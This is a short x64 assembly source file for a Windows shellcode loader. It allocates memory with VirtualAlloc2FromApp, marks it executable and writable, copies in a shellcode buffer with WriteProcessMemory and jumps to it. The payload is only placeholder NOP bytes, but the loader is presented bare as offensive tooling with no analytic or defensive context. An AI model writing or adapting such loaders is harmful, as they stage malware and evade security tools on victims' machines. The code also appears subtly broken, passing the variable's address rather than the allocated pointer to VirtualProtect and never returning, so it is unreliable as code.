; windows_loader64bits_virtualalloc2fromapp.asm

extrn VirtualAlloc2FromApp :PROC
extrn VirtualProtect :PROC
extrn GetCurrentProcess :PROC
extrn WriteProcessMemory :PROC

.data 
    shellcode   DB 90h, 90h, 90h, 90h, 90h, 0
    hProcess    DQ ?
    baseAddr    DQ ?
    oldProtect  DQ ?

.code
Start PROC
    SUB     rsp, 28h

    CALL    GetCurrentProcess
    MOV     hProcess, rax
    
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, 100h
    MOV     r9, 1000h ; MEM_COMMIT
    SUB     rsp, 56
    MOV     rax, 4h ; PAGE_READWRITE
    MOV     qword ptr [rsp+32], rax
    XOR     rax, rax
    MOV     qword ptr [rsp+40], rax
    MOV     qword ptr [rsp+48], rax
    CALL    VirtualAlloc2FromApp
    ADD     rsp, 56
    MOV     baseAddr, rax

    LEA     rcx, baseAddr
    MOV     rdx, 100h
    MOV     r8, 40h ; PAGE_EXECUTE_READWRITE
    LEA     r9, oldProtect
    CALL    VirtualProtect

    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, shellcode
    MOV     r9, SIZEOF shellcode
    SUB     rsp, 40 
    MOV     qword ptr [rsp+32], 0
    CALL    WriteProcessMemory
    ADD     rsp, 40 

    CALL    baseAddr

Start ENDP
END